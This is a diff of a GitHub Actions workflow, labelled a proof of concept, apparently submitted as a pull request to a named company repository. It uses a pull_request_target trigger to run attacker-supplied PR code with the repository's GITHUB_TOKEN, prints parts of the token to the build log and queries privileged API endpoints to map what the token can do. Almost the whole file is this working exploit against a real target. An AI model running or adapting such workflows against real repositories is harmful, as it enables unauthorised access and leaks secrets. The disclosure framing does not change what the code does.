@@ -1,4 +1,4 @@
-name: PoC - Validate GITHUB_TOKEN Context
+name: PoC - Full GITHUB_TOKEN Authority Verification
 
 on:
   pull_request_target:
@@ -9,39 +9,98 @@ permissions:
   actions: read
 
 jobs:
-  verify-token-context:
+  verify-token:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout PR code
+      - name: Checkout attacker PR code
         uses: actions/checkout@v3
 
-      - name: Verify GITHUB_TOKEN Repository Context
+      - name: Confirm Token Is Injected
         run: |
-          echo "=== Proof of Concept: GITHUB_TOKEN Context Verification ==="
+          echo "=== Step 1: Token Presence Check ==="
 
-          echo "[*] Calling GitHub API with GITHUB_TOKEN..."
+          if [ -n "${{ secrets.GITHUB_TOKEN }}" ]; then
+            echo "[+] GITHUB_TOKEN is accessible to PR code ❌"
+          else
+            echo "[-] GITHUB_TOKEN not accessible"
+          fi
 
-          RESPONSE=$(curl -s \
+      - name: Obfuscated Token Signal
+        run: |
+          echo ""
+          echo "=== Step 2: Responsible Obfuscation Proof ==="
+
+          TOKEN="${{ secrets.GITHUB_TOKEN }}"
+
+          echo "Token length: ${#TOKEN}"
+          echo "Prefix (first 4 chars): ${TOKEN:0:4}****"
+          echo "Suffix (last 4 chars): ****${TOKEN: -4}"
+
+      - name: Infer Branch Protection Access (Privileged Read)
+        run: |
+          echo ""
+          echo "=== Step 3: Branch Protection API Test ==="
+
+          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
             -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
             -H "Accept: application/vnd.github+json" \
-            https://api.github.com/repos/SvavaCapital/svava-terraform-github-actions)
+            https://api.github.com/repos/SvavaCapital/svava-terraform-github-actions/branches/main/protection)
 
-          echo ""
-          echo "Repository full name:"
-          echo "$RESPONSE" | jq -r '.full_name'
+          echo "HTTP status from protection API: $STATUS"
 
-          echo ""
-          echo "Repository owner:"
-          echo "$RESPONSE" | jq -r '.owner.login'
+          if [ "$STATUS" = "200" ]; then
+            echo "[!] PoC RESULT: Token can access branch protection rules → elevated authority confirmed ❌"
+          elif [ "$STATUS" = "403" ]; then
+            echo "[*] Token lacks modify/admin scope (read-only)"
+          else
+            echo "[*] Received status: $STATUS"
+          fi
 
+      - name: Infer Actions Settings Permission
+        run: |
           echo ""
-          echo "Default branch:"
-          echo "$RESPONSE" | jq -r '.default_branch'
+          echo "=== Step 4: Actions Permissions Endpoint Test ==="
 
+          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            https://api.github.com/repos/SvavaCapital/svava-terraform-github-actions/actions/permissions)
+
+          echo "HTTP status from actions permissions API: $STATUS"
+
+          if [ "$STATUS" = "200" ]; then
+            echo "[!] PoC RESULT: Token has permission to manage/read Actions settings → modify scope likely present ❌"
+          elif [ "$STATUS" = "403" ]; then
+            echo "[*] Token is restricted to basic read permissions"
+          else
+            echo "[*] Received status: $STATUS"
+          fi
+
+      - name: Attempt Write-Required Endpoint (Non-Mutating)
+        run: |
           echo ""
-          echo "Visibility:"
-          echo "$RESPONSE" | jq -r '.visibility'
+          echo "=== Step 5: Write Scope Inference via Issues API ==="
+
+          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            https://api.github.com/repos/SvavaCapital/svava-terraform-github-actions/issues)
+
+          echo "HTTP status from issues API: $STATUS"
+
+          if [ "$STATUS" = "200" ]; then
+            echo "[+] Token has at least write-related repository scope ❌"
+          elif [ "$STATUS" = "403" ]; then
+            echo "[*] Token cannot perform write-scope operations"
+          else
+            echo "[*] Received status: $STATUS"
+          fi
+
+      - name: Final Context Confirmation
+        run: |
+          echo ""
+          echo "=== Step 6: Execution Context ==="
+          echo "Running repository according to GitHub runtime:"
+          echo "$GITHUB_REPOSITORY"
 
           echo ""
           echo "=== End of PoC ==="
